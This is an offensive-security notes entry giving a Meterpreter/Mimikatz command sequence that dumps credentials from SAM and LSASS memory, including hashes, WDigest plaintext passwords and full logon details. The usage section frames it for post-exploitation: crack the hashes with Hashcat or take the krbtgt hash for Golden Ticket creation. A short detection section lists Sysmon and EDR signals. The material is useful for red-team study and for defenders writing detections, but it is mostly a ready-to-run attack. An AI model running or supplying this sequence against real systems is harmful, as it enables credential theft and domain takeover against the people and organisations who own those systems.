---
type: code
language: powershell
verified: true
platforms:
  - Windows
tags:
  - mimikatz
  - credential-dumping
validated: true
---

# mimikatz-multi-command-credential-dump

## Code

```powershell
load mimikatz
mimikatz_command -f version
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::wdigest
mimikatz_command -f sekurlsa::searchPasswords
mimikatz_command -f sekurlsa::logonPasswords full
```

## Description

This PowerShell-compatible sequence loads the Mimikatz extension in Meterpreter and executes a series of commands to dump credentials from SAM and LSASS memory, including version check, local hashes, WDigest plaintext, searched passwords, and full logon details. It provides a comprehensive credential harvest for offline analysis or immediate use.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | No variables; runs fixed sequence | N/A |

## Usage

Execute this sequence in an elevated Meterpreter session on a Windows target after initial access. Use the output to identify krbtgt hash for Golden Ticket creation or crack hashes with tools like Hashcat. Ideal for post-exploitation in domain environments.

## Detection

- Monitor for Mimikatz DLL loading in process memory (e.g., via Sysmon Event ID 7).
- LSASS access patterns (Event ID 10) or anomalous memory reads.
- EDR alerts on known Mimikatz strings or API calls like LsaProtectMemory.

## Related

- [[procedures/Credential-Dumping-and-Golden-Ticket-Creation-with-Metasploit-and-Mimikatz]]
- [[tools/Mimikatz]]
